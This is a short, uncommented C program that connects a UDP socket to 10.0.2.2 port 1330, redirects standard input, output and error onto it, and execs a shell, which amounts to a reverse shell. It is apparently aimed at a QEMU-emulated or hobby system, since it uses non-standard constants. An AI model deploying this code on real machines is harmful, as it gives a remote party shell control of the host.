
#include <errno.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
        int sock_fd = socket(AF_INET, SOCK_DGRAM, PROTO_UDP);

        struct sockaddr_in addr = {
            AF_INET, 1025, {0x0a00020f /* 10.0.2.15 */}, {0}};
        struct sockaddr_in dest = {
            AF_INET, 1330, {0x0a000202 /* 10.0.2.2 */}, {0}};

        int status;

        status =
            bind(sock_fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
        if (status < 0) {
                perror("bind()");
                return 1;
        }
        status = connect(sock_fd, (struct sockaddr *)&dest,
                         sizeof(struct sockaddr_in));
        if (status < 0) {
                perror("connect()");
                return 1;
        }

        dup2(sock_fd, 0);
        dup2(sock_fd, 1);
        dup2(sock_fd, 2);

        status = fork();
        if (status == 0) {
                char *argv0 = NULL;
                execve("sh", &argv0, NULL);
        } else if (status < 0) {
                perror("fork()");
                return 1;
        }

        return 0;
}
